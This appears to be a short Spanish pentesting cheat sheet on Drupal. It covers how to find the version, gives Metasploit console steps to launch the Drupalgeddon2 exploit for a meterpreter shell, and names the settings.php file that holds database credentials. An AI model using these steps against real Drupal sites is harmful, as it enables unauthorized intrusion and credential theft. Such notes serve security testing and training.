### Version drupal
* En ocasiones en el panel de login, podemos ver la version de drupal en el código fuente.
* A veces tenemos el robots.txt (nmap a veces lo encuentra), y nos dice la url escondida que hace referencia a la versión, por ej: /drupal-75-7
* en el fichero CHANGELOG.txt

### Vulnerabilidad Drupalgeddon
Es una vulnerabilidad que nos permite obtener una sesión de meterpreter que luego se puede convertir en una shell.

```bash
msfconsole

search drupal 7
use exploit/unix/webapp/drupal_drupalgeddon2

# completamos los campos y "run"
```

### BBDD fichero conexion
/path/to/drupal/sites/default/settings.php

ahí buscar la línea:
```bash
$databases['default']['default'] = array (
...
...
```
